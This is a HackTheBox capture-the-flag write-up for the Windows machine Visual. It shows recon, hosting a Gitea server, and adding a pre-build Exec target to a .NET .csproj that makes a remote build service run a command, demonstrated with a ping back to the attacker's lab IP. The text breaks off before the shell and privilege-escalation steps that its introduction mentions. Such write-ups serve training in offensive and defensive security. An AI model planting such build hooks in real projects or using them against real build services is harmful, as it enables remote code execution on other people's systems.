HTB: Visual
===========

![Visual](https://0xdf.gitlab.io/img/visual-cover.png)

Visual is all about abusing a Visual Studio build process. There’s a website that takes a hosted Git URL and loads a Visual Studio project from the URL and compiles it. I’ll stand up a Gitea server in a container and host a project with a pre-build action that runs a command and gets a shell. From there, I’ll drop a webshell into the XAMPP web root to get a shell as local service. This service is running without SeImpersonate privileges, but I’ll use the FullPower executable to recover this, and then GodPotato to get System.

## Box Info

Name[Visual](https://www.hackthebox.com/machines/visual) [![Visual](https://0xdf.gitlab.io/icons/box-visual.png)](https://www.hackthebox.com/machines/visual)

[Play on HackTheBox](https://www.hackthebox.com/machines/visual)Release Date[30 Sep 2023](https://twitter.com/hackthebox_eu/status/1707425057683710385)Retire Date24 Feb 2024OSWindows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)Base PointsMedium \[30\]Rated Difficulty![Rated difficulty for Visual](https://0xdf.gitlab.io/img/visual-diff.png)Radar Graph![Radar chart for Visual](https://0xdf.gitlab.io/img/visual-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:18:48 [![xct](https://www.hackthebox.eu/badge/image/13569)](https://app.hackthebox.com/users/13569)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)00:41:19 [![xct](https://www.hackthebox.eu/badge/image/13569)](https://app.hackthebox.com/users/13569)

Creator[![IsThisEnox](https://www.hackthebox.eu/badge/image/256488)](https://app.hackthebox.com/users/256488)

## Recon

### nmap

`nmap` finds one open TCP port, HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.234
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-20 14:56 EST
Nmap scan report for 10.10.11.234
Host is up (0.092s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds
oxdf@hacky$ nmap -p 80 -sCV 10.10.11.234
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-20 14:56 EST
Nmap scan report for 10.10.11.234
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds

```

Based on the Apache version, this his a Windows host, running a PHP webserver.

### Website - TCP 80

#### Site

The site offers a service that compiles Visual Studio projects:

![image-20240220150501049](https://0xdf.gitlab.io/img/image-20240220150501049.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

At the bottom, there’s text field to “Submit Your Repo”:

![image-20240220150533601](https://0xdf.gitlab.io/img/image-20240220150533601.png)

I know that HTB labs can’t access the internet, but giving it `https://github.com/0xdf/test` returns a message that says it’s trying:

![image-20240220152402317](https://0xdf.gitlab.io/img/image-20240220152402317.png)

This page is at `/uploads/bc52b27d25b2eb4fa36827c369fe26/`, and refreshes itself every few seconds, until it shows:

![image-20240220152450927](https://0xdf.gitlab.io/img/image-20240220152450927.png)

`.sln` is the extension for a Visual Studio project file, so that fits the theme.

#### Tech Stack

The site is a PHP site. Submissions go to `/submit.php`. The main site loads as `http://10.10.11.234/index.php`. Adding `index.php` to the end of the `uploads` path also loads.

The HTTP response headers don’t give much else of interest:

```
HTTP/1.1 200 OK
Date: Tue, 20 Feb 2024 20:04:00 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
X-Powered-By: PHP/8.1.17
Content-Length: 7534
Connection: close
Content-Type: text/html; charset=UTF-8

```

The 404 page is the default Apache page:

![image-20240220152613746](https://0xdf.gitlab.io/img/image-20240220152613746.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```
oxdf@hacky$ feroxbuster -u http://10.10.11.234 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.234
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       30w      302c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      299c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      117l      555w     7534c http://10.10.11.234/
301      GET        9l       30w      335c http://10.10.11.234/css => http://10.10.11.234/css/
301      GET        9l       30w      334c http://10.10.11.234/js => http://10.10.11.234/js/
301      GET        9l       30w      339c http://10.10.11.234/uploads => http://10.10.11.234/uploads/
301      GET        9l       30w      338c http://10.10.11.234/assets => http://10.10.11.234/assets/
403      GET       11l       47w      421c http://10.10.11.234/webalizer
200      GET      117l      555w     7534c http://10.10.11.234/index.php
403      GET       11l       47w      421c http://10.10.11.234/phpmyadmin
301      GET        9l       30w      335c http://10.10.11.234/CSS => http://10.10.11.234/CSS/
301      GET        9l       30w      334c http://10.10.11.234/JS => http://10.10.11.234/JS/
301      GET        9l       30w      339c http://10.10.11.234/Uploads => http://10.10.11.234/Uploads/
301      GET        9l       30w      338c http://10.10.11.234/Assets => http://10.10.11.234/Assets/
503      GET       11l       44w      402c http://10.10.11.234/examples
200      GET        0l        0w        0c http://10.10.11.234/submit.php
301      GET        9l       30w      334c http://10.10.11.234/Js => http://10.10.11.234/Js/
301      GET        9l       30w      335c http://10.10.11.234/Css => http://10.10.11.234/Css/
403      GET       11l       47w      421c http://10.10.11.234/licenses
403      GET       11l       47w      421c http://10.10.11.234/server-status
200      GET      117l      555w     7534c http://10.10.11.234/Index.php
301      GET        9l       30w      339c http://10.10.11.234/UPLOADS => http://10.10.11.234/UPLOADS/
200      GET        0l        0w        0c http://10.10.11.234/Submit.php
403      GET       11l       47w      421c http://10.10.11.234/server-info
[####################] - 3m    360000/360000  0s      found:22      errors:675
[####################] - 2m     30000/30000   169/s   http://10.10.11.234/
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/css/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/js/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 2m     30000/30000   167/s   http://10.10.11.234/uploads/
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/assets/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/CSS/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/JS/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 2m     30000/30000   169/s   http://10.10.11.234/Uploads/
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/Assets/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/Js/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   0/s     http://10.10.11.234/Css/ => Directory listing (remove --dont-extract-links to scan)
[####################] - 2m     30000/30000   187/s   http://10.10.11.234/UPLOADS/

```

It makes sense that the directories don’t seem to be case sensitive (standard for Windows). There are some 403s for `webalizer`, `phpmyadmin`, and `examples`. Might be the default XAMPP configuration.

## Shell as enox

### Connect Back

It seems clear that I need to get the site to upload some kind of malicious Visual Studio project. The first step is to get it to connect to something I control.

I’ll start a Python webserver on my VM and give the site a URL using my HTB VPN IP:

![image-20240220153643822](https://0xdf.gitlab.io/img/image-20240220153643822.png)

It takes a minute after I submit, but eventually there’s a request:

```
oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.234 - - [20/Feb/2024 15:37:42] code 404, message File not found
10.10.11.234 - - [20/Feb/2024 15:37:42] "GET /test/info/refs?service=git-upload-pack HTTP/1.1" 404 -

```

To get a better look at that, I’ll kill the webserver and listen on 80 with `nc`, and send the same URL:

```
oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.234 49677
GET /test/info/refs?service=git-upload-pack HTTP/1.1
Host: 10.10.14.6
User-Agent: git/2.41.0.windows.1
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd
Pragma: no-cache
Git-Protocol: version=2

```

It’s using `git` to try to get a repository from my server over HTTP.

### Host Gitea

I need to host a Git server. [Gitea](https://about.gitea.com/) seems like as good as any option. I’ll use Docker to get an instance up and running. First, I’ll pull the image:

```
oxdf@hacky$ docker pull gitea/gitea:latest
latest: Pulling from gitea/gitea
619be1103602: Pull complete
172dd90f8cd3: Pull complete
e351dffe3e2e: Pull complete
23115583656f: Pull complete
29191722a758: Pull complete
365242e44775: Pull complete
2b8d3024c169: Pull complete
Digest: sha256:a2095ce71c414c0c6a79192f3933e668a595f7fa7706324edd0aa25c8728f00f
Status: Downloaded newer image for gitea/gitea:latest
docker.io/gitea/gitea:latest

```

Now I’ll run the server, telling Docker to forward port 3000 through to me:

```
oxdf@hacky$ docker run -p 3000:3000 gitea/gitea
Generating /data/ssh/ssh_host_ed25519_key...
Generating /data/ssh/ssh_host_rsa_key...
2024/02/20 21:00:30 cmd/web.go:242:runWeb() [I] Starting Gitea on PID: 18
2024/02/20 21:00:30 cmd/web.go:111:showWebStartupMessage() [I] Gitea version: 1.21.5 built with GNU Make 4.4.1, go1.21.6 : bindata, timetzdata, sqlite, sqlite_unlock_notify
2024/02/20 21:00:30 cmd/web.go:112:showWebStartupMessage() [I] * RunMode: prod
2024/02/20 21:00:30 cmd/web.go:113:showWebStartupMessage() [I] * AppPath: /usr/local/bin/gitea
2024/02/20 21:00:30 cmd/web.go:114:showWebStartupMessage() [I] * WorkPath: /data/gitea
2024/02/20 21:00:30 cmd/web.go:115:showWebStartupMessage() [I] * CustomPath: /data/gitea
2024/02/20 21:00:30 cmd/web.go:116:showWebStartupMessage() [I] * ConfigFile: /data/gitea/conf/app.ini
2024/02/20 21:00:30 cmd/web.go:117:showWebStartupMessage() [I] Prepare to run install page
Generating /data/ssh/ssh_host_ecdsa_key...
Server listening on :: port 22.
Server listening on 0.0.0.0 port 22.
2024/02/20 21:00:31 cmd/web.go:304:listen() [I] Listen: http://0.0.0.0:3000
2024/02/20 21:00:31 cmd/web.go:308:listen() [I] AppURL(ROOT_URL): http://localhost:3000/
2024/02/20 21:00:31 ...s/graceful/server.go:70:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 18

```

Visiting `http://127.0.0.1:3000` offers the Gitea setup:

![image-20240220160109546](https://0xdf.gitlab.io/img/image-20240220160109546.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

It’s important to create an account at the bottom under “Administrator Account Settings”:

![image-20240220160145350](https://0xdf.gitlab.io/img/image-20240220160145350.png)

On clicking “Install Gitea”, it refreshes (and may crash, but on refreshing again) I’ve got a Gitea instance.

### Hello World

#### Strategy

Before I try to exploit this, I want to understand how the application works. I’m going to make a Hello World dummy application and upload it to Visual. I’ll show both how to do this in Windows and on Linux.

```
flowchart TD;
    A["Create in\nVisual Studio\non Windows"]-->B(Run on Visual);
    C["Create with\ndotnet\non Linux"]-->B;
linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

#### Make In Windows

I’ll create my own Visual Studio project by opening Visual Studio and creating a new project, select C# Console App, and give it the name Hello0xdf:

![image-20240221102712082](https://0xdf.gitlab.io/img/image-20240221102712082.png)

On the next screen I’ll make sure to pick .NET 6.0 (as that’s what the site on Visual said they support):

![image-20240221102754652](https://0xdf.gitlab.io/img/image-20240221102754652.png)

In the project that opens, there’s a `Program.cs` that has a simple print:

![image-20240221102838442](https://0xdf.gitlab.io/img/image-20240221102838442.png)

This creates a `Hello0xdf` folder that has a `Hello0xdf.sln` file in it:

![image-20240221102943896](https://0xdf.gitlab.io/img/image-20240221102943896.png)

The `Hello0xdf` folder in that has the source files, as well as the `Hello0xdf.csproj` file, which is also important:

![image-20240221103020908](https://0xdf.gitlab.io/img/image-20240221103020908.png)

If I “Build” -> “Build Solution”, it shows it generates a `.dll` executable:

```
Build started at 10:40 AM...
1>------ Build started: Project: Hello0xdf, Configuration: Debug Any CPU ------
1>Hello0xdf -> Z:\hackthebox\visual-10.10.11.234\projects\Hello0xdf\Hello0xdf\bin\Debug\net6.0\Hello0xdf.dll
========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
========== Build completed at 10:40 AM and took 00.724 seconds ==========

```

There’s actually a bunch of files, including a `.exe`:

```
PS > ls

    Directory: Z:\hackthebox\visual-10.10.11.234\projects\Hello0xdf\Hello0xdf\bin\Debug\net6.0

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
------         2/21/2024  10:41 AM         149504 Hello0xdf.exe
------         2/21/2024  10:41 AM          10244 Hello0xdf.pdb
------         2/21/2024  10:40 AM            419 Hello0xdf.deps.json
------         2/21/2024  10:40 AM            147 Hello0xdf.runtimeconfig.json
------         2/21/2024  10:41 AM           4608 Hello0xdf.dll
PS > .\Hello0xdf.exe
Hello, 0xdf!

```

I’ll copy these files back to my Linux host where I’ve got Gitea, and I’ll create a new repo:

![image-20240221104337151](https://0xdf.gitlab.io/img/image-20240221104337151.png)

I’ll name it “Hello0xdf”, and follow the instructions for creating a new repo around my project:

```
oxdf@hacky$ git init
Initialized empty Git repository in /media/sf_CTFs/hackthebox/visual-10.10.11.234/projects/Hello0xdf/.git/
oxdf@hacky$ git checkout -b main
Switched to a new branch 'main'
oxdf@hacky$ git add .
oxdf@hacky$ git commit -m "hello 0xdf!"
[main (root-commit) affd06e] hello 0xdf!
 30 files changed, 290 insertions(+)
 create mode 100644 .vs/Hello0xdf/DesignTimeBuild/.dtbcache.v2
 create mode 100644 .vs/Hello0xdf/FileContentIndex/8ce28047-0dfe-46b6-a3af-27764eadc730.vsidx
 create mode 100644 .vs/Hello0xdf/v17/.suo
 create mode 100644 Hello0xdf.sln
 create mode 100644 Hello0xdf/Hello0xdf.csproj
 create mode 100644 Hello0xdf/Program.cs
...[snip]...
oxdf@hacky$ git remote add origin http://10.10.14.6:3000/0xdf/Hello0xdf.git
oxdf@hacky$ git push -u origin main
Username for 'http://10.10.14.6:3000': 0xdf
Password for 'http://0xdf@10.10.14.6:3000':
Enumerating objects: 41, done.
Counting objects: 100% (41/41), done.
Delta compression using up to 8 threads
Compressing objects: 100% (34/34), done.
Writing objects: 100% (41/41), 95.20 KiB | 5.60 MiB/s, done.
Total 41 (delta 2), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.14.6:3000/0xdf/Hello0xdf.git
 * [new branch]      main -> main
Branch 'main' set up to track remote branch 'main' from 'origin'.

```

Now it shows up in Gitea:

![image-20240221104548310](https://0xdf.gitlab.io/img/image-20240221104548310.png)

#### Make in Linux

If I don’t want to go over to a Windows VM, I can make a project in Linux with `dotnet`. .Net version can be a real pain, so it’s easiest to just use a Docker container specifically for .NET 6 as the website says it supports (like I did in [Keeper](https://0xdf.gitlab.io/2024/02/10/htb-keeper.html#exploit-from-linux)). I’ll make a directory for this project, and share it into the container:

```
oxdf@hacky$ mkdir HelloLinux
oxdf@hacky$ docker run --rm -it -v HelloLinux:/HelloLiunx mcr.microsoft.com/dotnet/sdk:6.0 bash
Unable to find image 'mcr.microsoft.com/dotnet/sdk:6.0' locally
6.0: Pulling from dotnet/sdk
5d0aeceef7ee: Pull complete
7c2bfda75264: Pull complete
950196e58fe3: Pull complete
ecf3c05ee2f6: Pull complete
819f3b5e3ba4: Pull complete
19984358397d: Pull complete
d99f9f96f040: Pull complete
d6d23fc1b8fc: Pull complete
Digest: sha256:fdac9ba57a38ffaa6494b93de33983644c44d9e491e4e312f35ddf926c55a073
Status: Downloaded newer image for mcr.microsoft.com/dotnet/sdk:6.0
root@ef5f5f0ac789:/#

```

I am mounting the project directory into the container from my host so that I can use the container to make the project, but then my host to interact with Gitea and not have to worry about networking.

I’ll create a project:

```
root@ef5f5f0ac789:/HelloLiunx# dotnet new console
The template "Console App" was created successfully.

Processing post-creation actions...
Running 'dotnet restore' on /HelloLiunx/HelloLiunx.csproj...
  Determining projects to restore...
  Restored /HelloLiunx/HelloLiunx.csproj (in 64 ms).
Restore succeeded.

```

This creates a project with a Hello World program:

```
root@ef5f5f0ac789:/HelloLiunx# ls
HelloLiunx.csproj  Program.cs  obj
root@ef5f5f0ac789:/HelloLiunx# cat Program.cs
// See https://aka.ms/new-console-template for more information
Console.WriteLine("Hello, World!");

```

Now I need a Visual Studio solution file ( `.sln`):

```
root@ef5f5f0ac789:/HelloLiunx# dotnet new sln
The template "Solution File" was created successfully.

root@ef5f5f0ac789:/HelloLiunx# ls
HelloLiunx.csproj  HelloLiunx.sln  Program.cs  obj

```

This creates the `.sln` file, but doesn’t associate it at all with the `.csproj`:

```
root@ef5f5f0ac789:/HelloLiunx# cat HelloLiunx.sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.0.31903.59
MinimumVisualStudioVersion = 10.0.40219.1
Global
        GlobalSection(SolutionConfigurationPlatforms) = preSolution
                Debug|Any CPU = Debug|Any CPU
                Release|Any CPU = Release|Any CPU
        EndGlobalSection
        GlobalSection(SolutionProperties) = preSolution
                HideSolutionNode = FALSE
        EndGlobalSection
EndGlobal

```

I need to tie these together:

```
root@ef5f5f0ac789:/HelloLiunx# dotnet sln HelloLiunx.sln add HelloLiunx.csproj
Project `HelloLiunx.csproj` added to the solution.
root@ef5f5f0ac789:/HelloLiunx# cat HelloLiunx.sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.0.31903.59
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "HelloLiunx", "HelloLiunx.csproj", "{8851DCFA-2958-4CFF-ACA9-37734A7220F2}"
EndProject
Global
        GlobalSection(SolutionConfigurationPlatforms) = preSolution
                Debug|Any CPU = Debug|Any CPU
                Release|Any CPU = Release|Any CPU
        EndGlobalSection
        GlobalSection(SolutionProperties) = preSolution
                HideSolutionNode = FALSE
        EndGlobalSection
        GlobalSection(ProjectConfigurationPlatforms) = postSolution
                {8851DCFA-2958-4CFF-ACA9-37734A7220F2}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
                {8851DCFA-2958-4CFF-ACA9-37734A7220F2}.Debug|Any CPU.Build.0 = Debug|Any CPU
                {8851DCFA-2958-4CFF-ACA9-37734A7220F2}.Release|Any CPU.ActiveCfg = Release|Any CPU
                {8851DCFA-2958-4CFF-ACA9-37734A7220F2}.Release|Any CPU.Build.0 = Release|Any CPU
        EndGlobalSection
EndGlobal

```

Now the `.sln` has a reference to the `.csproj`.

This builds and runs:

```
root@ef5f5f0ac789:/HelloLiunx# dotnet build
MSBuild version 17.3.2+561848881 for .NET
  Determining projects to restore...
  All projects are up-to-date for restore.
  HelloLiunx -> /HelloLiunx/bin/Debug/net6.0/HelloLiunx.dll

Build succeeded.
    0 Warning(s)
    0 Error(s)

Time Elapsed 00:00:01.69
root@ef5f5f0ac789:/HelloLiunx# dotnet run
Hello, World!
root@ef5f5f0ac789:/HelloLiunx# ls bin/Debug/net6.0/
HelloLiunx  HelloLiunx.deps.json  HelloLiunx.dll  HelloLiunx.pdb  HelloLiunx.runtimeconfig.json

```

I’ll push that to Gitea the same way as the previous, creating a new repo, and then adding the remote (now back in my VM, out of the container):

```
oxdf@hacky$ git init
Initialized empty Git repository in /media/sf_CTFs/hackthebox/visual-10.10.11.234/projects/HelloLinux/.git/
oxdf@hacky$ git add .
oxdf@hacky$ git commit -m "hello world from linux"
[main (root-commit) b724c06] hello world from linux
 27 files changed, 285 insertions(+)
 create mode 100644 HelloLinux.csproj
 create mode 100644 HelloLinux.sln
 create mode 100644 Program.cs
 create mode 100644 bin/Debug/net8.0/HelloLinux
 create mode 100644 bin/Debug/net8.0/HelloLinux.deps.json
 create mode 100644 bin/Debug/net8.0/HelloLinux.dll
 create mode 100644 bin/Debug/net8.0/HelloLinux.pdb
 create mode 100644 bin/Debug/net8.0/HelloLinux.runtimeconfig.json
 create mode 100644 obj/Debug/net8.0/.NETCoreApp,Version=v8.0.AssemblyAttributes.cs
 create mode 100644 obj/Debug/net8.0/HelloLinux.AssemblyInfo.cs
 create mode 100644 obj/Debug/net8.0/HelloLinux.AssemblyInfoInputs.cache
 create mode 100644 obj/Debug/net8.0/HelloLinux.GeneratedMSBuildEditorConfig.editorconfig
 create mode 100644 obj/Debug/net8.0/HelloLinux.GlobalUsings.g.cs
 create mode 100644 obj/Debug/net8.0/HelloLinux.assets.cache
 create mode 100644 obj/Debug/net8.0/HelloLinux.csproj.CoreCompileInputs.cache
 create mode 100644 obj/Debug/net8.0/HelloLinux.csproj.FileListAbsolute.txt
 create mode 100644 obj/Debug/net8.0/HelloLinux.dll
 create mode 100644 obj/Debug/net8.0/HelloLinux.genruntimeconfig.cache
 create mode 100644 obj/Debug/net8.0/HelloLinux.pdb
 create mode 100644 obj/Debug/net8.0/apphost
 create mode 100644 obj/Debug/net8.0/ref/HelloLinux.dll
 create mode 100644 obj/Debug/net8.0/refint/HelloLinux.dll
 create mode 100644 obj/HelloLinux.csproj.nuget.dgspec.json
 create mode 100644 obj/HelloLinux.csproj.nuget.g.props
 create mode 100644 obj/HelloLinux.csproj.nuget.g.targets
 create mode 100644 obj/project.assets.json
 create mode 100644 obj/project.nuget.cache
oxdf@hacky$ git remote add origin http://10.10.14.6:3000/0xdf/HelloLinux.git
oxdf@hacky$ git push -u origin main
Username for 'http://10.10.14.6:3000': 0xdf
Password for 'http://0xdf@10.10.14.6:3000':
Enumerating objects: 32, done.
Counting objects: 100% (32/32), done.
Delta compression using up to 8 threads
Compressing objects: 100% (28/28), done.
Writing objects: 100% (32/32), 43.57 KiB | 5.45 MiB/s, done.
Total 32 (delta 2), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.14.6:3000/0xdf/HelloLinux.git
 * [new branch]      main -> main
Branch 'main' set up to track remote branch 'main' from 'origin'.

```

#### Submit to Visual

I’ll submit both of these to Visual via the web form. The result for my project returns the same files I got when building above:

![image-20240221104811458](https://0xdf.gitlab.io/img/image-20240221104811458.png)

If I have the `.exe`, the `.dll`, and the `.runtimeconfig.json` file in the same directory, they run:

```
PS Z:\hackthebox\visual-10.10.11.234 > .\Hello0xdf.exe
Hello, 0xdf!

```

The Linux build is similar (as long as I have the .NET version correct):

![image-20240221133958989](https://0xdf.gitlab.io/img/image-20240221133958989.png)

### Malicious VS Project

#### Strategy

It is possible to configure a project to run “pre-build” and “post-build” event commands. [This article from HowToGeek](https://www.howtogeek.com/devops/how-to-run-a-command-before-or-after-a-build-in-visual-studio/) goes into it. My idea here is to use a pre-build command to get execution when I submit it to the site and it builds the project. I’ll show three ways to do this:

```
flowchart TD;
    C[Add in VS]-->B;
    A[Modify .csproj]-->B(RCE);
    D[RCE Project\nfrom Github]-->B;
linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

#### Add in VS

In Visual Studio, I’ll go to “Project” -> “Hello0xdf Properties” to get the properties dialog, and under “Build” -> “Events” there’s a “Pre-build event” section. I’ll add a `ping`:

[![image-20240221112402814](https://0xdf.gitlab.io/img/image-20240221112402814.png)_Click for full size image_](https://0xdf.gitlab.io/img/image-20240221112402814.png)

If I try to build the project now, I’ll see it’s trying to ping my VPN IP (which the Windows VM isn’t aware of):

[![image-20240221112529494](https://0xdf.gitlab.io/img/image-20240221112529494.png)_Click for full size image_](https://0xdf.gitlab.io/img/image-20240221112529494.png)

Looking at git, there are a few updated files, but it’s the `.csproj` file that’s interesting:

```
oxdf@hacky$ git status
On branch main
Your branch is up to date with 'origin/main'.

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   .vs/Hello0xdf/DesignTimeBuild/.dtbcache.v2
        modified:   .vs/Hello0xdf/v17/.suo
        modified:   Hello0xdf/Hello0xdf.csproj

Untracked files:
  (use "git add <file>..." to include in what will be committed)
        .vs/Hello0xdf/v17/.futdcache.v2
        .vs/ProjectEvaluation/

no changes added to commit (use "git add" and/or "git commit -a")

```

I’ll push that to Gitea:

```
oxdf@hacky$ git add .
oxdf@hacky$ git commit -m "added pre-build ping"
[main adb2d18] added pre-build ping
 6 files changed, 4 insertions(+)
 create mode 100644 .vs/Hello0xdf/v17/.futdcache.v2
 rewrite .vs/Hello0xdf/v17/.suo (67%)
 create mode 100644 .vs/ProjectEvaluation/hello0xdf.metadata.v7.bin
 create mode 100644 .vs/ProjectEvaluation/hello0xdf.projects.v7.bin
oxdf@hacky$ git push
Username for 'http://10.10.14.6:3000': 0xdf
Password for 'http://0xdf@10.10.14.6:3000':
Enumerating objects: 23, done.
Counting objects: 100% (23/23), done.
Delta compression using up to 8 threads
Compressing objects: 100% (13/13), done.
Writing objects: 100% (14/14), 55.60 KiB | 5.56 MiB/s, done.
Total 14 (delta 4), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.14.6:3000/0xdf/Hello0xdf.git
   affd06e..adb2d18  main -> main

```

I’ll submit this repo to Visual, and have `tcpdump` listening for ICMP. After a couple minutes, I get pinged:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:28:02.138137 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 5, length 40
11:28:02.138179 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 5, length 40
11:28:03.144755 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 6, length 40
11:28:03.144784 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 6, length 40
11:28:04.160208 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 7, length 40
11:28:04.160229 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 7, length 40
11:28:05.175882 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 8, length 40
11:28:05.175901 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 8, length 40

```

And then it reports success:

![image-20240221112830045](https://0xdf.gitlab.io/img/image-20240221112830045.png)

#### Modify .csproj

The file that changed was the `.csproj` file, so I can just update that in my `HelloLinux` project. It starts as:

```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>

```

I’ll add a “PreBuild” target:

```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="ping 10.10.14.6" />
  </Target>

</Project>

```

If I `dotnet build` this in the container:

```
root@cdb07b3737f8:/HelloLiunx# dotnet build
MSBuild version 17.3.2+561848881 for .NET
  Determining projects to restore...
  All projects are up-to-date for restore.
  /bin/sh: 2: /tmp/MSBuildTemproot/tmp975b311408f24122bd271e2d6258d014.exec.cmd: ping: not found
/HelloLiunx/HelloLiunx.csproj(10,5): error MSB3073: The command "ping 10.10.14.6" exited with code 127.

Build FAILED.

/HelloLiunx/HelloLiunx.csproj(10,5): error MSB3073: The command "ping 10.10.14.6" exited with code 127.
    0 Warning(s)
    1 Error(s)

Time Elapsed 00:00:00.64

```

It fails because `ping` is not found. That’s ok, it’s trying to run the command!

I’ll update Git and push to Gitea:

```
oxdf@hacky$ git add HelloLiunx.csproj
oxdf@hacky$ git commit -m "added ping prebuild"
[main 19a7a39] added ping prebuild
 1 file changed, 3 insertions(+)
oxdf@hacky$ git push
Username for 'http://10.10.14.6:3000': 0xdf
Password for 'http://0xdf@10.10.14.6:3000':
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 8 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 385 bytes | 385.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.14.6:3000/0xdf/HelloLinux.git
   b74c17c..19a7a39  main -> main

```

Now when I resubmit the URL for this repo, I get ICMP packets at my host from Visual:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:59:00.653574 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 13, length 40
13:59:00.653601 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 13, length 40
